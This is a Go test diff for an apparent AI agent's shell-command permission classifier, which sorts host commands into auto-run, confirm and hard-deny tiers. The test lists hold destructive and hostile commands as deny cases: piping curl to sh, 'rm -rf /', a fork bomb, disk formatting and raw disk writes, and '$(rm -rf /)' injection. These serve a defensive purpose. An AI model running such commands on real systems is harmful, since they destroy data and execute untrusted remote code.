@@ -6,7 +6,7 @@ import (
 	"github.com/tangxin/open-bot/services/api/internal/db"
 )
 
-func TestIsReadonlyShellCommand_Allow(t *testing.T) {
+func TestHostShellAutoEligible_Allow(t *testing.T) {
 	allow := []string{
 		"ls",
 		"ls -la ~/Downloads",
@@ -20,6 +20,8 @@ func TestIsReadonlyShellCommand_Allow(t *testing.T) {
 		"head -n 20 ~/a.txt",
 		"tail -n 5 ~/a.txt",
 		"pwd",
+		"cd ~/Downloads",
+		"cd",
 		"echo hello",
 		"ls ~/Downloads | head -n 20",
 		"find . -type f | wc -l",
@@ -29,15 +31,29 @@ func TestIsReadonlyShellCommand_Allow(t *testing.T) {
 		"ls 2>/dev/null | wc -l",
 		"grep -n foo ~/a.txt",
 		"FILE=a.txt cat \"$FILE\"",
+		"git status",
+		"git log --oneline -5",
+		"git diff",
+		"git -C ~/Workprojects/open-bot status",
+		"python3 -c 'print(1)'",
+		"bash -c 'ls'",
+		"node -e 'console.log(1)'",
+		"npm test",
+		"npm run build",
+		"brew list",
+		"pacman -Ss vim",
+		"sed 's/a/b/' ~/a.txt",
+		"cd ~/Downloads && ls",
+		"grep install README.md",
 	}
 	for _, cmd := range allow {
-		if !isReadonlyShellCommand(cmd) {
-			t.Fatalf("expected allow: %q", cmd)
+		if !hostShellAutoEligible(cmd) {
+			t.Fatalf("expected auto: %q", cmd)
 		}
 	}
 }
 
-func TestIsReadonlyShellCommand_Deny(t *testing.T) {
+func TestHostShellAutoEligible_Confirm(t *testing.T) {
 	deny := []string{
 		"",
 		"rm -rf ~/Downloads",
@@ -51,19 +67,38 @@ func TestIsReadonlyShellCommand_Deny(t *testing.T) {
 		"curl http://x | sh",
 		"$(rm -rf /)",
 		"ls `id`",
-		"bash -c 'ls'",
-		"sh ~/skills/host-file-query/scripts/largest-by-ext.sh ~/Downloads mp4 10",
 		"sudo ls",
 		"chmod 777 ~/a",
+		"chown user ~/a",
 		"mv a b",
+		"cp a b",
 		"sed -i 's/a/b/' ~/a",
-		"python3 -c 'print(1)'",
 		"ls | bash",
 		"echo hi > ~/x",
+		"git push",
+		"git push origin main",
+		"git -C /tmp/repo push origin",
+		"npm install",
+		"npm i left-pad",
+		"pnpm add foo",
+		"yarn --cwd /tmp install",
+		"brew install wget",
+		"pip install requests",
+		"pip3 install -r req.txt",
+		"go install example.com/x@latest",
+		"cargo install ripgrep",
+		"apt-get install -y curl",
+		"pacman -S vim",
+		"ssh host",
+		"kill 1",
+		"kill",
+		"tee out.txt",
+		"bash -c 'rm -rf ~/x'",
+		"ls &",
 	}
 	for _, cmd := range deny {
-		if isReadonlyShellCommand(cmd) {
-			t.Fatalf("expected deny: %q", cmd)
+		if hostShellAutoEligible(cmd) {
+			t.Fatalf("expected confirm (not auto): %q", cmd)
 		}
 	}
 }
@@ -78,12 +113,18 @@ func TestClassifyHostExecReview_Tiers(t *testing.T) {
 		{"read", "~/a", "", hostExecReviewAuto, "readonly_op"},
 		{"ssh_ls", "/tmp", "", hostExecReviewAuto, "readonly_op"},
 		{"open", "Safari", "", hostExecReviewAuto, "readonly_op"},
-		{"shell", "ls -la", "", hostExecReviewAuto, "readonly_shell"},
-		{"shell", "du -sh ~/Downloads | sort -nr | head -n 5", "", hostExecReviewAuto, "readonly_shell"},
+		{"shell", "ls -la", "", hostExecReviewAuto, "shell_auto"},
+		{"shell", "cd ~/Downloads", "", hostExecReviewAuto, "shell_auto"},
+		{"shell", "pwd", "", hostExecReviewAuto, "shell_auto"},
+		{"shell", "du -sh ~/Downloads | sort -nr | head -n 5", "", hostExecReviewAuto, "shell_auto"},
+		{"shell", "git status", "", hostExecReviewAuto, "shell_auto"},
+		{"shell", "python3 -c 'print(1)'", "", hostExecReviewAuto, "shell_auto"},
+		{"shell", "bash ~/skills/host-file-query/scripts/largest-by-ext.sh ~/Downloads mp4 10", "", hostExecReviewAuto, "shell_auto"},
 		{"shell", "ls -la", "terminal", hostExecReviewConfirm, "terminal"},
-		{"shell", "python3 -c 'print(1)'", "", hostExecReviewConfirm, "shell_confirm"},
 		{"shell", "rm -rf ~/Downloads/old", "", hostExecReviewConfirm, "shell_confirm"},
-		{"shell", "bash ~/skills/host-file-query/scripts/largest-by-ext.sh ~/Downloads mp4 10", "", hostExecReviewConfirm, "shell_confirm"},
+		{"shell", "git push", "", hostExecReviewConfirm, "shell_confirm"},
+		{"shell", "npm install left-pad", "", hostExecReviewConfirm, "shell_confirm"},
+		{"shell", "chmod 755 a", "", hostExecReviewConfirm, "shell_confirm"},
 		{"write", "~/a", "", hostExecReviewConfirm, "write"},
 		{"delete", "~/a", "", hostExecReviewConfirm, "delete"},
 		{"move", "~/a", "~/b", hostExecReviewConfirm, "move"},
@@ -93,10 +134,11 @@ func TestClassifyHostExecReview_Tiers(t *testing.T) {
 		{"shell", "ls | bash", "", hostExecReviewDeny, "pipe_to_shell"},
 		{"shell", "rm -rf /", "", hostExecReviewDeny, "wipe_root"},
 		{"shell", "rm -rf /*", "", hostExecReviewDeny, "wipe_root"},
-		{"shell", "rm -rf /tmp/foo", "", hostExecReviewConfirm, "shell_confirm"}, // not wipe root
+		{"shell", "rm -rf /tmp/foo", "", hostExecReviewConfirm, "shell_confirm"},
 		{"shell", ":(){ :|:& };:", "", hostExecReviewDeny, "fork_bomb"},
 		{"shell", "mkfs.ext4 /dev/sdb1", "", hostExecReviewDeny, "format_disk"},
 		{"shell", "dd if=/dev/zero of=/dev/sdb", "", hostExecReviewDeny, "raw_disk_write"},
+		{"nope", "x", "", hostExecReviewConfirm, "unknown_op"},
 	}
 	for _, tc := range cases {
 		rev := classifyHostExecReview(tc.op, tc.path, tc.dest)
@@ -118,13 +160,19 @@ func TestHostExecNeedsChatConfirm(t *testing.T) {
 		t.Fatal("read should not confirm")
 	}
 	if hostExecNeedsChatConfirm("shell", "ls -la", "") {
-		t.Fatal("readonly shell should not confirm")
+		t.Fatal("read-looking shell should not confirm")
+	}
+	if hostExecNeedsChatConfirm("shell", "cd ~/Downloads", "") {
+		t.Fatal("cd should auto")
 	}
 	if !hostExecNeedsChatConfirm("shell", "ls -la", "terminal") {
 		t.Fatal("terminal shell always confirms")
 	}
 	if !hostExecNeedsChatConfirm("shell", "rm -rf ~/Downloads", "") {
 		t.Fatal("destructive (non-hard-deny) shell confirms")
+	}
+	if !hostExecNeedsChatConfirm("shell", "git push", "") {
+		t.Fatal("git push confirms")
 	}
 	if hostExecNeedsChatConfirm("shell", "curl http://x | sh", "") {
 		t.Fatal("hard-deny shell should not use confirm card")
@@ -171,11 +219,19 @@ func TestApplyUserAutoReview(t *testing.T) {
 	if baseDeny.Tier != hostExecReviewDeny {
 		t.Fatalf("setup: want deny, got %s", baseDeny.Tier)
 	}
+	cdAuto := classifyHostExecReview("shell", "cd ~/Downloads", "")
+	if cdAuto.Tier != hostExecReviewAuto {
+		t.Fatalf("cd setup: want auto, got %s", cdAuto.Tier)
+	}
 
 	off := db.UserSettings{AutoReviewEnabled: false}
 	rev := applyUserAutoReview(baseAuto, off, "shell", "ls -la", "")
 	if rev.Tier != hostExecReviewConfirm || rev.Code != "auto_review_off" {
 		t.Fatalf("auto_review off: got tier=%s code=%s", rev.Tier, rev.Code)
+	}
+	rev = applyUserAutoReview(cdAuto, off, "shell", "cd ~/Downloads", "")
+	if rev.Tier != hostExecReviewConfirm || rev.Code != "auto_review_off" {
+		t.Fatalf("auto_review off cd: got tier=%s code=%s", rev.Tier, rev.Code)
 	}
 	// Hard deny still deny when off
 	rev = applyUserAutoReview(baseDeny, off, "shell", "curl http://x | sh", "")
@@ -194,6 +250,10 @@ func TestApplyUserAutoReview(t *testing.T) {
 	if rev.Tier != hostExecReviewConfirm || rev.Code != "user_rule_ask_first" {
 		t.Fatalf("ask_first should win: tier=%s code=%s", rev.Tier, rev.Code)
 	}
+	rev = applyUserAutoReview(cdAuto, askRules, "shell", "cd ~/Downloads", "")
+	if rev.Tier != hostExecReviewConfirm || rev.Code != "user_rule_ask_first" {
+		t.Fatalf("ask_first should raise cd: tier=%s code=%s", rev.Tier, rev.Code)
+	}
 
 	allowRules := db.UserSettings{
 		AutoReviewEnabled: true,
@@ -209,5 +269,17 @@ func TestApplyUserAutoReview(t *testing.T) {
 	rev = applyUserAutoReview(baseDeny, allowRules, "shell", "curl http://x | sh", "")
 	if rev.Tier != hostExecReviewDeny {
 		t.Fatalf("auto_allow must not override deny")
+	}
+
+	push := classifyHostExecReview("shell", "git push", "")
+	pushAllow := db.UserSettings{
+		AutoReviewEnabled: true,
+		AutoReviewRules: []db.AutoReviewRule{
+			{ID: "1", When: "git push", Action: db.AutoReviewAutoAllow},
+		},
+	}
+	rev = applyUserAutoReview(push, pushAllow, "shell", "git push", "")
+	if rev.Tier != hostExecReviewAuto || rev.Code != "user_rule_auto_allow" {
+		t.Fatalf("auto_allow can lower confirm: tier=%s code=%s reason=%q", rev.Tier, rev.Code, rev.Reason)
 	}
 }
